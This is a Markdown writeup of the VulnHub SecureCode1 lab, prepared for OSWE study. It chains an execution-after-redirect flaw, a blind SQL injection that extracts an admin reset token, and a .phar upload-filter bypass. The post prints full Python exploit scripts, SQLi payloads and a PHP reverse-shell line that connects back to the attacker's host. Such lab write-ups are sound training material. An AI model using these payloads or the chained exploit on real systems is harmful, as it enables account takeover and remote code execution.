@@ -1,0 +1,510 @@
+---
+title: Securecode 1 Machine Writeup - OSWE Preparation 
+date: 2023-12-16 00:00:00 +0400
+categories: [Web, Whitebox]
+tags: [web, white-box, code-review, sql-injection, file-upload]     # TAG names should always be lowercase
+---
+
+# Background
+
+![](images/Pasted%20image%2020231215130006.png)
+
+The SecureCode01 machine is an OSWE-Like machine, created by sud0root, and is available on vulnhub (https://www.vulnhub.com/entry/securecode-1,651/). The main objectives of the machine is to perform a white-box assessment on a web app, find an authentication bypass, and obtain remote code execution for the final step. 
+
+Creating a proof-of-concept script chaining the vulnerabilities is also part of the objective. 
+# A quick TL;DR
+
+Through a white-box approach, a boolean-based blind SQL Injection vulnerability was found, which was only reachable due to an unenforced redirection (Execution after redirect vulnerability). 
+
+Through the SQLi, the admin user reset password token was exfiltrated from the database and used to be bypass authentication and achieve admin access.  
+
+The admin access gave access to multiple administrative tasks, including one were we could update items offered on the web app. Due to weak blacklisting filters on the image input field for these items, were able to bypass them and upload a PHP reverse shell payload and execute it to obtain RCE on the server..
+
+# Cue the recon-ish
+
+A port scan on the machine reveals that only port 80 is open, running an apache webserver version `2.4.29`
+
+![](images/Pasted%20image%2020231125070131.png)
+
+![](images/Pasted%20image%2020231125070240.png)
+
+The web application is featuring a countdown, indicating the site is still being developed. Through directory bruteforcing, we were able to identify several interesting directories and files, including `robots.txt`, `/login`, `/users`, and `/includes`. 
+The `Include` endpoint showed that the backend is running on PHP, with files such as `connection.php` and `header.php`
+
+```shell
+feroxbuster -u http://securecode01 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -s 200 301 400 401 403 --quiet --dont-scan "css|asset"
+```
+
+![](images/Pasted%20image%2020231125070819.png)
+
+Visiting the users and/or profile endpoints redirects us to the login page on `/login/login.php`. 
+
+![](images/Pasted%20image%2020231125071211.png)
+
+The login form is a standard one, with a `forgot your password` option.  The forgot password page seemed interesting. When testing for valid usernames, we can get one of two outputs: `Username not found` in case of failure, or the `reset link has been sent to email` in case the user actually exists.
+
+![The output when entering a username that does not exist/](images/Pasted%20image%2020231125072226.png)
+
+However, when testing for SQL Injection and inputting usernames such as `test'`, we get no output; as if something went wrong in the background.
+
+At this point I went and searched for a way to get the source code, since this is a white box machine. The source code can be downloaded through `/source_code.zip`
+
+# A Dive in the source
+
+The application's source has the structure as seen in the figure below, with pages segregated based on functionality.
+
+![](images/Pasted%20image%2020231125073503.png)
+
+What we are interested in is the resetPassword page, as we want to figure out the peculiar behavior and verify the validity of our assumption that a SQL injection vulnerability exists there.
+
+## resetPassword - Assumption proven false
+
+![](images/Pasted%20image%2020231125074426.png)
+
+The reset password page starts with sanitizing the username with `mysqli_real_escape_string` function, which does a pretty good job at stopping SQLi with quoted literals. After that, it checks that the username field is set and that the username is alphanumerical, if not then it doesn't execute the whole block.
+
+This actually disproves our assumption, but we'll have our moment, for certain. Moving on down the page's source, we see two functions: `generateToken`, and `send_email`. 
+
+![](images/Pasted%20image%2020231125074650.png)
+
+The send_email is vulnerable to SQL Injection **IF** the username passed to it is not sanitized, which as seen earlier, is unfortunately (or fortunate depending on how you look at it) not the case.  
+
+However, the `generateToken` function is interesting, because it is using the `rand` function to generate the supposedly random token.  According to PHP's Documentation, the `rand` function does not generate cryptographically secure values. 
+
+![PHP's Docs on rand() function](images/Pasted%20image%2020231125074942.png)
+
+This is certainly interesting, if we could potentially mimic the state of the rand function locally, we could predict the reset tokens and reset passwords for accounts of legitimate users. 
+
+The following read by Jacob Moore was very insightful, it showcases how PHP's PRNGs rand and srand() operate under the hood, as well how to potentially replicate their results given certain information. 
+
+https://medium.com/@moorejacob2017/exploiting-weak-pseudo-random-number-generation-in-phps-rand-and-srand-functions-445229b83e01
+
+However, with some more research, it was found that while `rand` can be exploited, we needed to obtain a token value generated by the function so that we can recover the seed; which we could not do unless we had access to one of the users accounts. Lets leave this on hold (spoiler, it'll remain on hold forever) and try to get more information. 
+## doChangePassword Page - Another idea squashed.
+
+![Change Password Page](images/Pasted%20image%2020231125080619.png)
+
+The change password page `doChangePassowrd.php` takes in the `token` and `password` as `GET` parameters. It checks if the token is a valid token and if so it then checks the users' records to see who has said token assigned to them. If the token is valid then the password is changed, otherwise it fails.
+
+What is interesting here is that `in_array` is being used to check the token. 
+### Want some magic? - PHP Loose comparisons, and in_array()
+
+PHP is a loosely typed language, meaning it dynamically assigns a data type to a variable based on its value and the context where it is used. This is important when accounting the fact that PHP has two types of comparisons: `loose` and `strict`.
+
+`Loose` comparisons are indicated with `==`, while `strict` ones utilize `===`. Strict comparisons ensure both the type and value equality. 
+
+Loose comparisons on the other hand check for the value, changing the operands type if necessary. This open it up for Type Juggling vulnerabilities. The below example showcases the difference between strict and loose comparisons.
+
+```php
+php > print( 1 === 1 ? "True" : "False" ); // Strict, True
+php > print( 1 == 1 ? "True" : "False" ); // Loose, True
+php > print( 1 === "1" ? "True" : "False" ); // Strict, False
+php > print( 1 == "1" ? "True" : "False" ); // Loose, True
+```
+
+In addition to that, PHP numbers can be expressed in the scientific notation, using the letter `e` or `E` (case insensitive).
+
+![](images/Pasted%20image%2020231125104900.png)
+
+Now, with the concept of loose comparisons in our mind, we have to check the in_array function. PHP's documentation says that the function search for a value in an array using `Loose Comparisons`, unless `strict` is set to true, which it isn't in our target application.
+
+![Target Program](images/Pasted%20image%2020231125104242.png)
+
+Thats another lead; if we can generate a token that starts with `0e` or `0E` followed by numbers, then when that token is checked against the input `0` will result in a valid token response.
+
+![Testing loose comparison of in_array in PHP 8.0](images/Pasted%20image%2020231125105420.png)
+
+ Before getting too excited, there is one thing that ruins this idea; the where clause in the `UPDATE` query following the `in_array` in `doChangePassword`
+
+```SQL
+"UPDATE user SET password = '$hash' WHERE token = '$p_token'
+```
+
+The above will obviously fail unless we get the the exact token value, so bypassing the in_array is not that useful in this case either.
+
+# The Breakthrough
+## Pages that allow unauthenticated access.
+
+Pages with unauthenticated access are good targets since their vulnerabilities are specially impactful. Using grep, we can search for such pages with the following command:
+
+```shell
+$> grep -R -L "isAuthenticated" --include=\*.php --exclude-dir asset
+```
+
+The above command search for all `php` files within the source code, excluding the asset directory, which dont have the string `'isAuthenticated'` within them. The `isAuthenticated.php` file contains the check for authenticated sessions. 
+
+![Files without isAuthenticated check](images/Pasted%20image%2020231125082825.png)
+
+The command above shows us the usual `login` and `include` routes, but if we look carefully, the `viewItem` page in the `/item/` route too. This might be interesting.
+
+## viewItem Page - A Boolean based Blind SQLi Vulnerability
+
+![viewItem.php](images/Pasted%20image%2020231125082758.png)
+
+We can see the SQL injection vulnerability in the query. The fact that the `id` is not quoted in the query means the `real_escape_string` sanitizing filter will not prevent the SQL injection as the developer might expect. 
+
+The page returns one of two responses depending on the output of the query `SELECT * FROM item WHERE id = $id`. We control the ID parameter. 
+
+If the query returns a record, i.e. a true response, then the `http_response_code(404)` block is executed and a `404` response code is returned. Otherwise, we get a `302` response code.
+
+This has all the makings of a `blind sql injection` spot, we can utilize it to extract the admin token from the user table using nested queries .  
+
+### But can we reach it?
+
+However, that block is preceded with a custom session check to verify a user is authenticated as `admin`. I am going to admit it, when I saw this block the first time, I thought there was no way to exploit it without being logged in first. ALWAYS verify your assumption. 
+
+```php
+if($_SESSION['id_level'] != 1){
+...
+header("Location...");
+}
+```
+
+After spending countless attempts trying to replicate the `rand()` state and the loose comparison of `in_array` ideas, I came back to this page and noticed that something is missing. Can you spot it?
+### An EAR (Execution After Redirect), just sitting there, menacingly 
+
+While the application is indeed redirecting the unauthenticated user away from the page, nothing is telling the server to stop execution. This causes the instructions below the redirect function to be executed, this is the definition of an execution after redirect vulnerability that affects the control flow.
+
+A redirect `header(Location)` block must be followed by an `exit` or `die` instruction in order to prevent the code blocks following it from being executed. In the case above, there is no `exit` instruction, which means the server will happily execute the block vulnerable to SQL Injection, even though its is only meant for authenticated users. 
+
+This definitely didn't take a few hours for me to notice, definiteeely. 
+
+![](images/anime-boy.gif)
+# Connecting The dots
+
+***The information we have gathered include:***
+- We have the capability to generate reset tokens at will for any user through the `resetPassword` page.
+- We can also directly use the tokens to change passwords through the `doChangePassword` page.
+- a blind SQL injection vulnerability in `item/viewItem`, in the `id` parameter. 
+- A `404` response indicates a TRUE response, while a `302` response indicates a FALSE response.
+
+***The Authentication Bypass flow:***
+- Generate a token for the admin user through `resetPassword`
+- Exploit the SQL Injection vulnerability in `viewItem`  to retrieve the generated token from the users table.
+- Use the exfiltrated token to change the admin password.
+- Login as admin with the new password.
+# Auth Bypass PoC 
+1 - Generate a token for the user `admin` by sending a `POST` request to `/login/resetPassword.php`.
+
+```python
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import string 
+import sys 
+
+BASE_URL = "http://securecode01"
+LOGIN_PAGE = "/login/login.php"
+RESET_PASSWORD = "/login/resetPassword.php"
+DO_CHANGE_PASSWORD = "/login/doChangePassword.php"
+VIEW_ITEM_PAGE = "/item/viewItem.php"
+
+SESSION = requests.Session()
+
+def request_reset(username):
+    data = {"username": username}
+    response = SESSION.post(BASE_URL + RESET_PASSWORD, data=data)
+    assert "Success" in response.text, "Reset request did not complete successfully."
+```
+
+2 - prepare a payload to extract the admin reset token from `item/viewItem.php`.
+
+```python
+def sqli_exfil_character(session, payload):
+    data = {"id": payload}
+    response = session.get(BASE_URL + VIEW_ITEM_PAGE, params=data, allow_redirects=False)
+    return response.status_code == 404
+
+# Multi-threaded SQL Injection, speedy exfiltration thanks to https://github.com/rizemon/exploit-writing-for-oswe
+
+TOKEN_LENGTH = 16
+MAX_WORKERS = 100 
+def exfiltrate_token(session):
+    def boolean_sqli(arguments):
+        idx, ascii_val, session = arguments
+        payload = f"-1 OR BINARY CHAR({ord(ascii_val)}) = (SELECT SUBSTRING(token, {idx + 1}, 1) FROM user where id = 1)#"
+        return ascii_val, sqli_exfil_character(session, payload)
+
+    result = ""
+    # Go through each character position
+    for idx in range(TOKEN_LENGTH):
+        # Use MAX_WORKERS threads to test possible ASCII values in parallel
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            CHARSET = string.ascii_letters + string.digits
+            responses = executor.map(boolean_sqli, [(idx, ascii_val, session) for ascii_val in CHARSET])
+
+        # Go through each response and determine which ASCII value is correct
+        for ascii_val, truth in responses:
+            if truth:
+                result += ascii_val
+                break
+    
+    return result
+
+
+```
+
+3 - Query `doChangePassword.php `to change the password for the admin user.
+
+```python
+def change_password(token, new_password):
+    data = {"token": token, "password": new_password}
+    response = SESSION.post(BASE_URL + DO_CHANGE_PASSWORD, params=data)
+    if "Password Changed" not in response.text:
+        return False
+    return True
+```
+
+4 - Login as admin.
+
+```python
+# Step 4
+def login_user(session, username, password):
+    success = False
+    data = {"username": username, "password": password}
+    response = session.post(BASE_URL + LOGIN_PAGE, data=data)
+    if "Success" in response.text:
+        success = True
+        match = re.findall(r"FLAG1: (\w*)?", response.text)
+        if(match):
+            print(f"Flag1: {match[0]}")
+    return success
+```
+
+5 - Combine all that to get the auth bypass RCE: 
+
+```python
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import string 
+import sys 
+import re
+
+BASE_URL = "http://securecode01"
+LOGIN_PAGE = "/login/checkLogin.php"
+RESET_PASSWORD = "/login/resetPassword.php"
+DO_CHANGE_PASSWORD = "/login/doChangePassword.php"
+VIEW_ITEM_PAGE = "/item/viewItem.php"
+
+SESSION = requests.Session()
+
+# Step 1
+def request_reset(username):
+    data = {"username": username}
+    response = SESSION.post(BASE_URL + RESET_PASSWORD, data=data)
+    assert "Success" in response.text, "Reset request did not complete successfully."
+# Step 3
+def change_password(token, new_password):
+    data = {"token": token, "password": new_password}
+    response = SESSION.post(BASE_URL + DO_CHANGE_PASSWORD, params=data)
+    if "Password Changed" not in response.text:
+        return False
+    return True
+
+# Step 2
+def sqli_exfil_character(session, payload):
+    data = {"id": payload}
+    response = session.get(BASE_URL + VIEW_ITEM_PAGE, params=data, allow_redirects=False)
+    return response.status_code == 404
+    
+TOKEN_LENGTH = 16
+MAX_WORKERS = 100 
+def exfiltrate_token(session):
+    def boolean_sqli(arguments):
+        idx, ascii_val, session = arguments
+        payload = f"-1 OR BINARY CHAR({ord(ascii_val)}) = (SELECT SUBSTRING(token, {idx + 1}, 1) FROM user where id = 1)#"
+        return ascii_val, sqli_exfil_character(session, payload)
+
+    result = ""
+    # Go through each character position
+    for idx in range(TOKEN_LENGTH):
+        # Use MAX_WORKERS threads to test possible ASCII values in parallel
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            CHARSET = string.ascii_letters + string.digits
+            responses = executor.map(boolean_sqli, [(idx, ascii_val, session) for ascii_val in CHARSET])
+
+        # Go through each response and determine which ASCII value is correct
+        for ascii_val, truth in responses:
+            if truth:
+                result += ascii_val
+                break
+    
+    return result
+
+# Step 4
+def login_user(session, username, password):
+    success = False
+    data = {"username": username, "password": password}
+    response = session.post(BASE_URL + LOGIN_PAGE, data=data)
+    if "Success" in response.text:
+        success = True
+        match = re.findall(r"FLAG1: (\w*)?", response.text)
+        if(match):
+            print(f"[+] Flag1: {match[0]}")
+    return success
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("[USAGE] poc.py http://<targetip> <localip> <localport>")
+        exit()
+    BASE_URL = sys.argv[1]
+    HOST = sys.argv[2] # we'll make use of this and the port later
+    PORT = sys.argv[3] 
+    
+    username = "admin"
+    password = "admin"
+    # Request Admin
+    print("[!] Requesting Admin Password Reset...")
+    request_reset(username)
+    print("[+] Admin Password Reset Requested, time to get the token")
+    ## Exfiltrate Token
+    print("[!] ViewItem SQLi to exfilterate the admin token...")
+    user_token = exfiltrate_token(SESSION)
+    print(f"[+] {username} Token Found: {user_token}")
+    ## Change User Password
+    print("[!] Changing admin password using that token.")
+    if not change_password(user_token, password):
+        print("[-] Password Change failed, verify the validity of the token.")
+        exit()
+    print(f"[+] {username} password changed, New creds => {username}:{password}")
+    # Login with new creds
+    if not login_user(SESSION, username, password):
+        print(f"[-] Could not login with credentials {username}:{password}")
+        exit()
+    print(f"[+] Login Successful as {username}.")
+
+```
+
+![We Are In](images/Pasted%20image%2020231125162900.png)
+
+# The path to RCE - Bypassing File Upload Filters
+
+The application gives users the ability to add items through two main forms:  `/item/addItem.php` and `/item/updateItem`. From these forms, we can upload files to the server although there are filters in place to prevent users from upload arbitrary files. 
+
+## AddItem
+
+![Add Item](images/Pasted%20image%2020231125163230.png)
+
+![newItem.php Source](images/Pasted%20image%2020231125163249.png)
+
+Notice the filters on file extensions and mime types, luckily, both of these can be bypassed through simple means. The extension bypass is as simple as naming our payload script as `payload.php.gif`, as the extension field of `$_FILES['image']['name']['extension]'` takes the last extension in the name.
+
+Bypassing the mime check is also simple, as it is checking the magic header of the file we upload. To achieve the bypass, we can simply add the magic header for a GIF file with `GIF89a` at the beginning of our script. 
+
+![Script is recognized as a GIF thanks to the header](images/Pasted%20image%2020231125164139.png)
+
+Filters bypassed, but for some reason uploading new files wasn't working so I went forward with the next best option, updateItem.
+
+## UpdateItem
+
+The updateItem was a more lucrative target as it didnt check for the mime type, only for the extension.
+
+![updateItem.php source](images/Pasted%20image%2020231125183350.png)
+
+It is worth noting that there is an `.htaccess` file in the image folder, preventing the execution of the file types we see in the filter above.
+
+![.htaccess](images/Pasted%20image%2020231125182846.png)
+
+But php scripts are not confined to only these extensions, a quick look on `hacktricks` presents a wide range of extensions that could be used for PHP scripts, including `phar` which is not blacklisted and works flawlessly against our target.
+
+![Potential PHP script extensions](images/Pasted%20image%2020231125183010.png)
+
+With that, we can update an existing item and change the image to our crafted payload file to get a webshell.
+
+![Our Payload](images/Pasted%20image%2020231125183156.png)
+![result of the id command](images/Pasted%20image%2020231125183304.png)
+
+Time to automate the thing.
+
+# Remote Code Execution PoC
+
+Our goal now is to get a reverse shell; continuing on our previous PoC, we'll add a few more functions to::
+- Create a `php .phar` file containing our reverse shell payload.
+- Update an Item's image to our crafted Phar file, 
+- Visit the file once uploaded to execute it and get the reverse shell. 
+
+Start by creating the function to create the Phar file with the PHP reverse shell payload:
+
+```python
+SCRIPT_DIR = os.path.abspath( os.path.dirname( __file__ ) )
+REVSHELL_DIR = SCRIPT_DIR + "/normal.phar"
+REVSHELL_UPLOAD_PATH = "/item/image/normal.phar"
+# Step 5: Create the reverse shell file to be uploaded
+def create_rev_shell(HOST, PORT):
+    payload = f'<?php $sock=fsockopen("{HOST}",{PORT});$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+    with open(REVSHELL_DIR, "w") as revshell:
+        revshell.write(payload)
+    print(f"[+] Reverse Shell Created; The target will connect to {HOST}:{PORT}")
+    return True
+```
+
+Afterwards, create the function to update an item info and upload our `phar` payload as the image.
+
+```python
+# Step 6: Update Item
+UPDATE_ITEM_PAGE = "/item/updateItem.php"
+def update_item(session):
+    data = {"id": "1", "id_user": "1", "name": "Testing Item", "description": "Description of the test item", "price": "100" }
+    file = {"image": ("normal.phar", open(REVSHELL_DIR, "rb"))}
+    response = session.post(BASE_URL + UPDATE_ITEM_PAGE, files=file, data=data)
+
+    if "Success" in response.text:
+        print(f"[+] Print Reverse Shell uploaded, find it in {REVSHELL_UPLOAD_PATH}.")
+        return True
+    return False
+```
+
+Last but not least, create the function that will visit the page with the payload.
+
+```python
+def execute_revshell(session):
+    print(BASE_URL + REVSHELL_UPLOAD_PATH)
+    response = session.get(BASE_URL + REVSHELL_UPLOAD_PATH)
+    assert response.status_code != 404, "Reverse Shell not found"
+```
+
+# Putting it all together
+
+Once we have our functions defined, our listener up and running `nc -nlvp 9999`, we can simply run the functions one by one to get the reverse shell.
+
+```python
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("[USAGE] poc.py http://<targetip> <localip> <localport>")
+        exit()
+    BASE_URL = sys.argv[1]
+    HOST = sys.argv[2]
+    PORT = sys.argv[3]
+    
+    username = "admin"
+    password = "admin"
+    # Request Admin
+    request_reset(username)
+    print("[+] Admin Password Reset Requested, time to get the token")
+    ## Exfiltrate Token
+    user_token = exfiltrate_token(SESSION)
+    print(f"[+] {username} Token Found: {user_token}")
+    ## Change User Password
+    if not change_password(user_token, password):
+        print("[-] Password Change failed, verify the validity of the token.")
+        exit()
+    print(f"[+] {username} password changed, New creds => {username}:{password}")
+    # Login with new creds
+    if not login_user(SESSION, username, password):
+        print(f"[-] Could not login with credentials {username}:{password}")
+        exit()
+    print(f"[+] Login Successful as {username}.")
+    create_rev_shell(HOST, PORT)
+    update_item(SESSION)
+    execute_revshell(SESSION)
+```
+
+![Executing the PoC](images/Pasted%20image%2020231125194233.png)
+
+![Reverse Shell obtained](images/Pasted%20image%2020231125194205.png)
+
+The second flag is in /var/www.
+
+![Flag2.txt](images/Pasted%20image%2020231125194449.png)
+# Full POC:
+
+Can be found in poc.py, requires python 3.
